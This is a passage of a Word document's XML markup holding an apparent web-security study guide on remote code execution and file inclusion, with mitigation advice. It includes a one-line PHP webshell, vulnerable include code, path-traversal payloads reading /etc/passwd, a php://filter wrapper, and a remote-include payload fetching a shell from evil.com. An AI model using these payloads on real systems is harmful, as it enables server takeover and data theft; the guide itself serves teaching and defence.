        </w:rPr>
        <w:t xml:space="preserve">Example PHP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Webshell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> system($_GET['</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>']); ?&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Usage: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>shell.php?cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>whoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3E59EBD2" w14:textId="78EB6025" w:rsidR="005770B4" w:rsidRDefault="005770B4" w:rsidP="00C6157F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:bookmarkStart w:id="203" w:name="_Toc208408674"/>
      <w:r>
        <w:t>Exploiting Deserialization</w:t>
      </w:r>
      <w:bookmarkEnd w:id="203"/>
    </w:p>
    <w:p w14:paraId="1AB8A66A" w14:textId="77777777" w:rsidR="005770B4" w:rsidRDefault="005770B4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Use gadget chains (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ysoserial</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, PHPGGC) to craft payloads that execute commands when </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>deserialized</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D50328" w14:textId="2371C51D" w:rsidR="005770B4" w:rsidRDefault="005770B4" w:rsidP="00C6157F">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:bookmarkStart w:id="204" w:name="_Toc208408675"/>
      <w:r>
        <w:t>Indicators of RCE Vulnerability</w:t>
      </w:r>
      <w:bookmarkEnd w:id="204"/>
    </w:p>
    <w:p w14:paraId="5EE6D66B" w14:textId="77777777" w:rsidR="005770B4" w:rsidRDefault="005770B4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>- Response includes command output.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Delayed responses after sleep/ping.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Out-of-band interaction (DNS/HTTP requests).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Uploaded files executed unexpectedly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BCAC3F" w14:textId="56D3061F" w:rsidR="005770B4" w:rsidRDefault="005770B4" w:rsidP="00C6157F">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:bookmarkStart w:id="205" w:name="_Toc208408676"/>
      <w:r>
        <w:t>Tools</w:t>
      </w:r>
      <w:bookmarkEnd w:id="205"/>
    </w:p>
    <w:p w14:paraId="5928E3DF" w14:textId="77777777" w:rsidR="005770B4" w:rsidRDefault="005770B4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>- Burp Suite Intruder (fuzzing separators/commands)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Commix (automated command injection)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ysoserial</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> / PHPGGC (deserialization gadgets)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (post-exploitation)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> + Responder (reverse shells)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BACCF0" w14:textId="2B7E6C5E" w:rsidR="005770B4" w:rsidRDefault="005770B4" w:rsidP="00EF610E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:bookmarkStart w:id="206" w:name="_Toc208408677"/>
      <w:r>
        <w:t>Mitigation Strategies</w:t>
      </w:r>
      <w:bookmarkEnd w:id="206"/>
    </w:p>
    <w:p w14:paraId="6954CE61" w14:textId="77777777" w:rsidR="005770B4" w:rsidRDefault="005770B4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>- Avoid passing user input to system commands.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- Use safe APIs (parameter arrays in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>subprocess</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> calls).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- Avoid </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/exec with untrusted input.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Validate uploaded files (extensions, MIME type, storage).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- Disable dangerous functions in PHP (system, exec, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>passthru</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Sandbox apps with limited privileges.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Principle of least privilege: even if RCE occurs, impact is limited.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68A3B9BB" w14:textId="6EEE9838" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="005A70E0">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="207" w:name="_Toc208408678"/>
      <w:r>
        <w:t>File Inclusion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="207"/>
    </w:p>
    <w:p w14:paraId="6C191F1C" w14:textId="77777777" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:r>
        <w:t>File Inclusion vulnerabilities occur when a web application dynamically loads files based on user input without proper validation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="126FCE28" w14:textId="77777777" w:rsidR="005A70E0" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Local File Inclusion (LFI): Attacker includes files already on the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="393A8F73" w14:textId="04678541" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Remote File Inclusion (RFI): Attacker includes files from a remote server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169E0745" w14:textId="21F16EB2" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="00D77533">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="208" w:name="_Toc208408679"/>
      <w:r>
        <w:t>Attack Surface</w:t>
      </w:r>
      <w:bookmarkEnd w:id="208"/>
    </w:p>
    <w:p w14:paraId="4789A966" w14:textId="77777777" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:r>
        <w:t>Example vulnerable PHP code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="073484E6" w14:textId="77777777" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:r>
        <w:t>&lt;?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="04DB330A" w14:textId="3852A1F3" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:r>
        <w:t>$page = $_GET[‘page’];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6841C50C" w14:textId="58473D1E" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Include($page . “.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>”);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02E2BCE6" w14:textId="3E5A500C" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:r>
        <w:t>?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0956C482" w14:textId="77777777" w:rsidR="00D77533" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Normal use: ?page=about → loads </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>about.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="088BD10F" w14:textId="77777777" w:rsidR="00D77533" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>LFI: ?page=../../../../</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0C3C1046" w14:textId="14868AE9" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">RFI (if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>allow_url_include</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=On): ?page=http://evil.com/shell.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="774903D3" w14:textId="5FA9FD6B" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="00D77533">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="209" w:name="_Toc208408680"/>
      <w:r>
        <w:t>Exploitation Techniques</w:t>
      </w:r>
      <w:bookmarkEnd w:id="209"/>
    </w:p>
    <w:p w14:paraId="4724B0E9" w14:textId="5AF38651" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="004A6A99">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="210" w:name="_Toc208408681"/>
      <w:r>
        <w:t>Local File Inclusion (LFI)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="210"/>
    </w:p>
    <w:p w14:paraId="23291F0E" w14:textId="77777777" w:rsidR="004A6A99" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Read or execute local files:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="153DB1C5" w14:textId="77777777" w:rsidR="004A6A99" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Read sensitive files: ?page=../../../../</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="78FDB6D4" w14:textId="77777777" w:rsidR="004A6A99" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Windows: ?page=../../../../windows/win.ini</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E61EC2" w14:textId="77777777" w:rsidR="004A6A99" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Log Poisoning: inject PHP payload into logs, then include the log file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5CA391" w14:textId="77777777" w:rsidR="009E3FBC" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Session File Poisoning: inject payload into /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sess</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>_&lt;id&gt;, include it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFE736B" w14:textId="40F3ADBB" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">PHP Wrappers: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>://filter/convert.base64-encode/resource=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="259EB879" w14:textId="0150BD00" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="009E3FBC">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="211" w:name="_Toc208408682"/>
      <w:r>
        <w:t>Remote File Inclusion (RFI)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="211"/>
    </w:p>
    <w:p w14:paraId="5517C350" w14:textId="77777777" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="009E3FBC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Load remote malicious file if remote includes are allowed:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="234DB790" w14:textId="77777777" w:rsidR="003E0CB1" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>?page=http://evil.com/shell.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79987419" w14:textId="2DD36EC8" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Where shell.txt contains: &lt;?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> system($_GET[‘</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>’]); ?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AAD1F9" w14:textId="1BE4D5DD" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="212" w:name="_Toc208408683"/>
      <w:r>
        <w:t>LFI → RCE Escalation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="212"/>
    </w:p>
    <w:p w14:paraId="7C463710" w14:textId="18CDC207" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Log Poisoning: inject payload into Apache logs via User-Agent, include log.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CBB5973" w14:textId="21A0F947" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>proc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/self/environ: inject payload via HTTP header, include environ.</w:t>
      </w:r>
    </w:p>
